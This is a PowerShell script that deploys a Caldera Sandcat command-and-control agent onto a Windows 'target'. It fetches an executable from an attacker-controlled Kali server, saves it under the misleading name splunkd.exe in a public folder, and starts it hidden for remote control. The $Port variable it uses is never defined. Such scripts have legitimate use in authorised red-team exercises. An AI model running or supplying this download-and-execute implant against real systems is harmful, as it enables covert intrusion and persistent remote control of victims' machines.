# Caldera Sandcat Agent Deploy Script
# Run as Administrator on Windows target

param(
    [string]$KaliIP = "192.168.1.100",
    [string]$AgentPath = "C:\Users\Public\splunkd.exe"
)

function Deploy-CalderaAgent {
    Write-Host "[*] Deploying Caldera Sandcat Agent..." -ForegroundColor Green
    
    # Set Caldera server details
    $server = "http://$KaliIP`:$Port"
    $url = "$server/file/download"
    
    try {
        # Create WebClient and set headers
        $wc = New-Object System.Net.WebClient
        $wc.Headers.add("platform", "windows")
        $wc.Headers.add("file", "sandcat.go")
        
        Write-Host "[*] Downloading Sandcat agent from $url..." -ForegroundColor Yellow
        $data = $wc.DownloadData($url)
        
        # Stop existing agent processes
        Write-Host "[*] Checking for existing agent processes..." -ForegroundColor Yellow
        Get-Process | Where-Object { 
            $_.Modules -and $_.Modules.FileName -like $AgentPath 
        } | Stop-Process -Force
        
        # Remove existing agent file
        if (Test-Path $AgentPath) {
            Remove-Item -Force $AgentPath -ErrorAction Ignore
        }
        
        # Write new agent file
        Write-Host "[*] Writing agent to $AgentPath..." -ForegroundColor Yellow
        [System.IO.File]::WriteAllBytes($AgentPath, $data)
        
        # Start the agent
        Write-Host "[*] Starting Sandcat agent..." -ForegroundColor Yellow
        Start-Process -FilePath $AgentPath -ArgumentList "-server $server -group red" -WindowStyle Hidden
        
        Write-Host "[+] Agent deployed successfully!" -ForegroundColor Green
        Write-Host "[*] Agent should now be visible in Caldera interface" -ForegroundColor Cyan
        
    } catch {
        Write-Host "[-] Error deploying agent: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Execute deployment
Deploy-CalderaAgent
